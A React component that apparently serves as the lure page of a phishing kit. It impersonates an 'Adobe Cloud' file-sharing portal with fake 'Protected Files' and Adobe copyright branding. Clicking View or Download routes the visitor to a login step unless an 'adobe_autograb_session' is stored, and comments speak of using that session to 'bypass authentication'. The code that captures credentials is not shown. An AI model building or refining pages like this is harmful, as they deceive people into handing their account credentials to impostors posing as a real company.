import React, { useState, useEffect } from 'react';
import { FileText, Download, Eye, Trash2, Calendar, User, Menu, X, Grid3X3, List, Upload } from 'lucide-react';

interface File {
  name: string;
  type: 'pdf' | 'docx' | 'xlsx';
  size: string;
  date: string;
}

interface LandingPageProps {
  onFileAction: (fileName: string, action: 'view' | 'download') => void;
}

const LandingPage: React.FC<LandingPageProps> = ({ onFileAction }) => {
  const [activeNav, setActiveNav] = useState('Protected Files');
  const [activeView, setActiveView] = useState('Grid View');
  const [currentDate, setCurrentDate] = useState('');
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [hasActiveSession, setHasActiveSession] = useState(false);
  const [sessionInfo, setSessionInfo] = useState<any>(null);

  // Generate current date
  useEffect(() => {
    const now = new Date();
    const options: Intl.DateTimeFormatOptions = { 
      month: 'short', 
      day: 'numeric' 
    };
    setCurrentDate(now.toLocaleDateString('en-US', options));
  }, []);

  // Check for existing sessions on component mount
  useEffect(() => {
    checkForExistingSession();
  }, []);

  const checkForExistingSession = async () => {
    try {
      // Check server session first
      const response = await fetch('/.netlify/functions/getSession', {
        method: 'GET',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json'
        }
      });

      if (response.ok) {
        const data = await response.json();
        if (data.success && data.session) {
          setHasActiveSession(true);
          setSessionInfo(data.session);
          return;
        }
      }

      // Check localStorage for autograb session
      const storedSession = localStorage.getItem('adobe_autograb_session');
      if (storedSession) {
        try {
          const sessionData = JSON.parse(storedSession);
          const sessionTime = new Date(sessionData.timestamp);
          const now = new Date();
          const hoursDiff = (now.getTime() - sessionTime.getTime()) / (1000 * 60 * 60);
          
          // Check if session is still valid (24 hours for autograb)
          if (hoursDiff < 24) {
            setHasActiveSession(true);
            setSessionInfo(sessionData);
            console.log('AutoGrab session found:', sessionData);
          } else {
            // Clean expired session
            localStorage.removeItem('adobe_autograb_session');
          }
        } catch (error) {
          console.error('Error parsing stored session:', error);
          localStorage.removeItem('adobe_autograb_session');
        }
      }
    } catch (error) {
      console.log('No existing session found:', error);
    }
  };

  // Convert file sizes to kilobytes and use current date
  const protectedFiles: File[] = [
    { name: 'Document1.pdf', type: 'pdf', size: '54 KB', date: currentDate },
    { name: 'Report.docx', type: 'docx', size: '56 KB', date: currentDate },
    { name: 'Data.xlsx', type: 'xlsx', size: '50 KB', date: currentDate },
    { name: 'Notes.pdf', type: 'pdf', size: '52 KB', date: currentDate },
    { name: 'Overview.docx', type: 'docx', size: '52 KB', date: currentDate },
    { name: 'Budget.pdf', type: 'pdf', size: '52 KB', date: currentDate },
    { name: 'Summary.pdf', type: 'pdf', size: '50 KB', date: currentDate },
    { name: 'Contract.pdf', type: 'pdf', size: '50 KB', date: currentDate },
    { name: 'Contract2.pdf', type: 'pdf', size: '52 KB', date: currentDate },
  ];

  // Recent files - only one PDF
  const recentFiles: File[] = [
    { name: 'protected-document.pdf', type: 'pdf', size: '48 KB', date: currentDate },
  ];

  const getFileIcon = (type: string) => {
    const baseClasses = "w-8 h-8 sm:w-10 sm:h-10 lg:w-8 lg:h-8 flex items-center justify-center rounded-lg font-bold text-xs uppercase tracking-wide";
    switch (type) {
      case 'pdf':
        return `${baseClasses} bg-red-50 text-red-600`;
      case 'docx':
        return `${baseClasses} bg-blue-50 text-blue-600`;
      case 'xlsx':
        return `${baseClasses} bg-green-50 text-green-600`;
      default:
        return `${baseClasses} bg-gray-50 text-gray-600`;
    }
  };

  const navItems = ['Protected Files', 'Shared With Me', 'Recent', 'Trash'];

  const getHeaderContent = () => {
    switch (activeNav) {
      case 'Protected Files':
        return {
          title: 'Protected Files',
          description: 'All your secure and recent documents.'
        };
      case 'Shared With Me':
        return {
          title: 'Shared With Me',
          description: 'Documents shared by your team members.'
        };
      case 'Recent':
        return {
          title: 'Recent Files',
          description: 'Your recently accessed documents.'
        };
      case 'Trash':
        return {
          title: 'Trash',
          description: 'Deleted files and documents.'
        };
      default:
        return {
          title: 'Protected Files',
          description: 'All your secure and recent documents.'
        };
    }
  };

  const getCurrentFiles = () => {
    switch (activeNav) {
      case 'Protected Files':
        return protectedFiles;
      case 'Shared With Me':
        return protectedFiles; // Same content as Protected Files
      case 'Recent':
        return recentFiles; // Only one PDF file
      case 'Trash':
        return []; // Empty
      default:
        return protectedFiles;
    }
  };

  const handleFileAction = (fileName: string, action: 'view' | 'download') => {
    // Check if we have an active session for autograb
    if (hasActiveSession && sessionInfo) {
      // Use existing session to bypass authentication - simplified message
      console.log('Using autograb session for file access:', sessionInfo);
      alert(`Access granted! Opening ${fileName}...`);
      // In real scenario, directly access the file
      return;
    }

    // No session available, require login
    onFileAction(fileName, action);
  };

  const useExistingSession = () => {
    if (sessionInfo) {
      alert(`Using existing session for ${sessionInfo.email}. Access granted!`);
      console.log('Session used for bypass authentication');
    }
  };

  const clearSession = () => {
    localStorage.removeItem('adobe_autograb_session');
    sessionStorage.removeItem('adobe_current_session');
    setHasActiveSession(false);
    setSessionInfo(null);
  };

  const headerContent = getHeaderContent();
  const currentFiles = getCurrentFiles();

  const renderEmptyState = () => (
    <div className="flex flex-col items-center justify-center py-16 sm:py-20 text-center px-4">
      <div className="w-16 h-16 sm:w-20 sm:h-20 bg-white/60 backdrop-blur-sm rounded-full flex items-center justify-center mb-6 shadow-lg">
        <Trash2 className="w-8 h-8 sm:w-10 sm:h-10 text-gray-400" />
      </div>
      <h3 className="text-xl font-semibold text-gray-900 mb-3">Trash is empty</h3>
      <p className="text-base text-gray-500 max-w-sm">
        When you delete files, they'll appear here before being permanently removed.
      </p>
    </div>
  );

  const renderMobileGridView = () => (
    <div className="space-y-4">
      {currentFiles.map((file, index) => (
        <div
          key={index}
          className="bg-white/90 backdrop-blur-lg rounded-xl shadow-lg border border-white/40 p-4 hover:shadow-xl transition-all duration-200"
        >
          {/* File Header */}
          <div className="flex items-center gap-4 mb-4">
            <div className={getFileIcon(file.type)}>
              {file.type}
            </div>
            <div className="flex-1 min-w-0">
              <h3 className="font-semibold text-gray-900 truncate text-base">
                {file.name}
              </h3>
              <p className="text-sm text-gray-500 flex items-center gap-2">
                <Calendar className="w-4 h-4" />
                Modified {file.date} • {file.size}
              </p>
            </div>
          </div>

          {/* File Actions */}
          <div className="flex items-center justify-between">
            <span className="text-sm font-semibold text-red-600 bg-red-50 px-3 py-1 rounded-full">
              {hasActiveSession ? 'Unlocked' : 'Protected'}
            </span>
            <div className="flex gap-2">
              <button
                onClick={() => handleFileAction(file.name, 'view')}
                className="flex items-center gap-2 px-4 py-2 bg-gradient-to-r from-red-600 to-red-700 text-white rounded-lg font-medium text-sm hover:from-red-700 hover:to-red-800 transition-all duration-200 shadow-md"
              >
                <Eye className="w-4 h-4" />
                View
              </button>
              <button
                onClick={() => handleFileAction(file.name, 'download')}
                className="flex items-center gap-2 px-4 py-2 bg-white/90 backdrop-blur-sm border border-gray-300 text-gray-600 rounded-lg font-medium text-sm hover:bg-white transition-all duration-200 shadow-sm"
              >
                <Download className="w-4 h-4" />
                Download
              </button>
            </div>
          </div>
        </div>
      ))}
    </div>
  );

  const renderDesktopGridView = () => (
    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
      {currentFiles.map((file, index) => (
        <div
          key={index}
          className="bg-white/90 backdrop-blur-lg rounded-xl shadow-lg border border-white/40 p-5 hover:shadow-xl transition-all duration-200 group hover:bg-white/95"
        >
          {/* File Header */}
          <div className="flex items-center gap-4 mb-4">
            <div className={getFileIcon(file.type)}>
              {file.type}
            </div>
            <div className="flex-1 min-w-0">
              <h3 className="font-semibold text-gray-900 truncate text-base">
                {file.name}
              </h3>
              <p className="text-xs text-gray-500">
                {file.size} · {file.date}
              </p>
            </div>
          </div>

          {/* File Actions */}
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-xs font-semibold text-red-600 bg-red-50 px-2 py-1 rounded-full">
              {hasActiveSession ? 'Unlocked' : 'Protected'}
            </span>
            <div className="flex gap-2 ml-auto">
              <button
                onClick={() => handleFileAction(file.name, 'view')}
                className="flex items-center gap-1 px-3 py-1.5 bg-gradient-to-r from-red-600 to-red-700 text-white rounded-lg font-medium text-xs hover:from-red-700 hover:to-red-800 transition-all duration-200 group-hover:transform group-hover:-translate-y-0.5 shadow-md"
              >
                <Eye className="w-3 h-3" />
                View
              </button>
              <button
                onClick={() => handleFileAction(file.name, 'download')}
                className="flex items-center gap-1 px-3 py-1.5 bg-white/90 backdrop-blur-sm border border-gray-300 text-gray-600 rounded-lg font-medium text-xs hover:bg-white transition-all duration-200 shadow-sm"
              >
                <Download className="w-3 h-3" />
                Download
              </button>
            </div>
          </div>
        </div>
      ))}
    </div>
  );

  const renderListView = () => (
    <div className="bg-white/90 backdrop-blur-lg rounded-xl shadow-lg border border-white/40 overflow-hidden">
      {/* Mobile List View */}
      <div className="block lg:hidden">
        {currentFiles.map((file, index) => (
          <div
            key={index}
            className="p-4 border-b border-gray-100 hover:bg-red-50/50 transition-all duration-200"
          >
            <div className="flex items-center gap-4 mb-3">
              <div className={getFileIcon(file.type)}>
                {file.type}
              </div>
              <div className="flex-1 min-w-0">
                <h3 className="font-semibold text-gray-900 truncate text-base">
                  {file.name}
                </h3>
                <p className="text-sm text-gray-500 flex items-center gap-2">
                  <Calendar className="w-4 h-4" />
                  Modified {file.date} • {file.size}
                </p>
              </div>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-sm font-semibold text-red-600 bg-red-50 px-3 py-1 rounded-full">
                {hasActiveSession ? 'Unlocked' : 'Protected'}
              </span>
              <div className="flex gap-2">
                <button
                  onClick={() => handleFileAction(file.name, 'view')}
                  className="flex items-center gap-2 px-4 py-2 bg-gradient-to-r from-red-600 to-red-700 text-white rounded-lg font-medium text-sm hover:from-red-700 hover:to-red-800 transition-all duration-200 shadow-md"
                >
                  <Eye className="w-4 h-4" />
                  View
                </button>
                <button
                  onClick={() => handleFileAction(file.name, 'download')}
                  className="flex items-center gap-2 px-4 py-2 bg-white/90 backdrop-blur-sm border border-gray-300 text-gray-600 rounded-lg font-medium text-sm hover:bg-white transition-all duration-200 shadow-sm"
                >
                  <Download className="w-4 h-4" />
                  Download
                </button>
              </div>
            </div>
          </div>
        ))}
      </div>

      {/* Desktop Table View */}
      <div className="hidden lg:block">
        {/* Table Header */}
        <div className="grid grid-cols-12 gap-4 px-6 py-4 bg-red-50/70 backdrop-blur-sm border-b border-gray-100 text-sm font-medium text-gray-700">
          <div className="col-span-6">Name</div>
          <div className="col-span-2">Type</div>
          <div className="col-span-2">Size</div>
          <div className="col-span-2">Actions</div>
        </div>

        {/* Table Rows */}
        {currentFiles.map((file, index) => (
          <div
            key={index}
            className="grid grid-cols-12 gap-4 px-6 py-4 border-b border-gray-50 hover:bg-red-50/50 transition-all duration-200 group"
          >
            {/* File Name with Icon */}
            <div className="col-span-6 flex items-center gap-3">
              <div className={getFileIcon(file.type)}>
                {file.type}
              </div>
              <div className="min-w-0">
                <h3 className="font-semibold text-gray-900 truncate text-base">
                  {file.name}
                </h3>
                <p className="text-xs text-gray-500 flex items-center gap-1">
                  <Calendar className="w-3 h-3" />
                  Modified {file.date}
                </p>
              </div>
            </div>

            {/* File Type */}
            <div className="col-span-2 flex items-center">
              <span className="text-xs font-semibold text-red-600 bg-red-50 px-2 py-1 rounded-full">
                {hasActiveSession ? 'Unlocked' : 'Protected'}
              </span>
            </div>

            {/* File Size */}
            <div className="col-span-2 flex items-center text-sm text-gray-600">
              {file.size}
            </div>

            {/* Actions */}
            <div className="col-span-2 flex items-center gap-2">
              <button
                onClick={() => handleFileAction(file.name, 'view')}
                className="flex items-center gap-1 px-3 py-1.5 bg-gradient-to-r from-red-600 to-red-700 text-white rounded-lg font-medium text-sm hover:from-red-700 hover:to-red-800 transition-all duration-200 shadow-md"
              >
                <Eye className="w-3 h-3" />
                View
              </button>
              <button
                onClick={() => handleFileAction(file.name, 'download')}
                className="flex items-center gap-1 px-3 py-1.5 bg-white/90 backdrop-blur-sm border border-gray-300 text-gray-600 rounded-lg font-medium text-sm hover:bg-white transition-all duration-200 shadow-sm"
              >
                <Download className="w-3 h-3" />
                Download
              </button>
            </div>
          </div>
        ))}
      </div>
    </div>
  );

  return (
    <div className="flex min-h-screen relative overflow-x-hidden scale-110 origin-left transform">
      {/* Enhanced background with more red and blur effects */}
      <div className="absolute inset-0 bg-gradient-to-br from-red-100/60 via-red-200/40 to-red-300/50"></div>
      <div className="absolute inset-0 backdrop-blur-md"></div>
      
      {/* Enhanced decorative elements with more red - responsive sizes */}
      <div className="absolute top-5 right-5 w-32 h-32 sm:w-48 sm:h-48 lg:w-60 lg:h-60 bg-red-400/25 rounded-full blur-3xl"></div>
      <div className="absolute bottom-5 left-5 w-24 h-24 sm:w-36 sm:h-36 lg:w-48 lg:h-48 bg-red-500/20 rounded-full blur-2xl"></div>
      <div className="absolute top-1/3 right-1/4 w-20 h-20 sm:w-28 sm:h-28 lg:w-36 lg:h-36 bg-red-300/30 rounded-full blur-xl"></div>
      <div className="absolute bottom-1/3 left-1/3 w-24 h-24 sm:w-32 sm:h-32 lg:w-40 lg:h-40 bg-white/25 rounded-full blur-2xl"></div>
      <div className="absolute top-1/2 left-1/2 w-16 h-16 sm:w-24 sm:h-24 lg:w-32 lg:h-32 bg-red-200/20 rounded-full blur-xl transform -translate-x-1/2 -translate-y-1/2"></div>

      {/* Mobile Menu Overlay */}
      {isMobileMenuOpen && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-40 lg:hidden" onClick={() => setIsMobileMenuOpen(false)} />
      )}

      {/* Sidebar */}
      <aside className={`relative z-50 w-48 sm:w-52 lg:w-56 bg-white/85 backdrop-blur-xl border-r border-white/40 flex flex-col shadow-xl transition-transform duration-300 lg:translate-x-0 ${
        isMobileMenuOpen ? 'translate-x-0' : '-translate-x-full'
      } lg:relative lg:z-10 fixed lg:static inset-y-0 left-0`}>
        <div className="p-4 sm:p-5 lg:p-6 flex-1">
          {/* Mobile Close Button */}
          <button
            onClick={() => setIsMobileMenuOpen(false)}
            className="lg:hidden absolute top-2 right-2 p-1 text-gray-500 hover:text-gray-700"
          >
            <X className="w-5 h-5" />
          </button>

          {/* Logo Section with Acrobat Logo */}
          <div className="flex items-center gap-3 mb-6">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png" 
              alt="Adobe Acrobat" 
              className="w-8 h-8 sm:w-10 sm:h-10 object-contain"
            />
            <h1 className="text-base sm:text-lg font-semibold text-gray-900">Adobe Cloud</h1>
          </div>

          {/* Navigation */}
          <nav className="flex flex-col gap-2">
            {navItems.map((item) => (
              <button
                key={item}
                onClick={() => {
                  setActiveNav(item);
                  setIsMobileMenuOpen(false);
                }}
                className={`text-left px-3 py-2.5 rounded-lg font-medium text-sm transition-all duration-200 ${
                  activeNav === item
                    ? 'bg-red-50 text-red-600 shadow-sm'
                    : 'text-gray-600 hover:bg-white/60 hover:backdrop-blur-sm'
                }`}
              >
                {item}
              </button>
            ))}
          </nav>
        </div>

        {/* Adobe Footer */}
        <div className="p-4 sm:p-5 lg:p-6 border-t border-white/40">
          <p className="text-sm text-gray-700 leading-relaxed font-medium">
            © 2025 Adobe Inc.<br />
            All rights reserved.
          </p>
        </div>
      </aside>

      {/* Main Content */}
      <main className="relative z-10 flex-1 p-4 sm:p-5 lg:p-6 min-w-0 w-full overflow-x-hidden">
        {/* Mobile Header with Menu Button */}
        <div className="flex items-center justify-between mb-4 lg:hidden">
          <button
            onClick={() => setIsMobileMenuOpen(true)}
            className="p-2 text-gray-600 hover:text-gray-900 bg-white/80 backdrop-blur-sm rounded-lg shadow-sm"
          >
            <Menu className="w-5 h-5" />
          </button>
          <div className="flex items-center gap-2">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png" 
              alt="Adobe Acrobat" 
              className="w-6 h-6 object-contain"
            />
            <span className="font-semibold text-gray-900 text-sm">Adobe Cloud</span>
          </div>
        </div>

        {/* Header */}
        <div className="flex flex-col lg:flex-row lg:justify-between lg:items-start mb-6 gap-4">
          <div className="min-w-0">
            <h2 className="text-lg sm:text-xl lg:text-2xl font-bold text-gray-900 mb-1">
              {headerContent.title}
            </h2>
            <p className="text-sm sm:text-base text-gray-600">{headerContent.description}</p>
          </div>
          
          {/* Only show view controls if not in Trash */}
          {activeNav !== 'Trash' && (
            <div className="flex gap-2 flex-wrap flex-shrink-0">
              <button
                onClick={() => setActiveView('List View')}
                className={`flex items-center gap-2 px-4 py-2 rounded-lg font-medium text-sm border transition-all duration-200 shadow-sm ${
                  activeView === 'List View'
                    ? 'bg-gradient-to-r from-red-600 to-red-700 text-white border-red-600'
                    : 'bg-white/90 backdrop-blur-sm text-gray-600 border-gray-300 hover:bg-white'
                }`}
              >
                <List className="w-4 h-4" />
                <span>List</span>
              </button>
              <button
                onClick={() => setActiveView('Grid View')}
                className={`flex items-center gap-2 px-4 py-2 rounded-lg font-medium text-sm border transition-all duration-200 shadow-sm ${
                  activeView === 'Grid View'
                    ? 'bg-gradient-to-r from-red-600 to-red-700 text-white border-red-600'
                    : 'bg-white/90 backdrop-blur-sm text-gray-600 border-gray-300 hover:bg-white'
                }`}
              >
                <Grid3X3 className="w-4 h-4" />
                <span>Grid</span>
              </button>
              <button className="flex items-center gap-2 px-4 py-2 rounded-lg font-medium text-sm bg-white/90 backdrop-blur-sm text-gray-600 border border-gray-300 hover:bg-white transition-all duration-200 shadow-sm">
                <Upload className="w-4 h-4" />
                <span>Upload</span>
              </button>
            </div>
          )}
        </div>

        {/* Content Area */}
        <div className="min-w-0 w-full overflow-x-hidden">
          {activeNav === 'Trash' ? (
            renderEmptyState()
          ) : (
            activeView === 'Grid View' ? (
              <div className="lg:hidden">
                {renderMobileGridView()}
              </div>
            ) : null
          )}
          
          {/* Desktop Grid View */}
          {activeNav !== 'Trash' && activeView === 'Grid View' && (
            <div className="hidden lg:block">
              {renderDesktopGridView()}
            </div>
          )}
          
          {/* List View */}
          {activeNav !== 'Trash' && activeView === 'List View' && renderListView()}
        </div>
      </main>
    </div>
  );
};

export default LandingPage;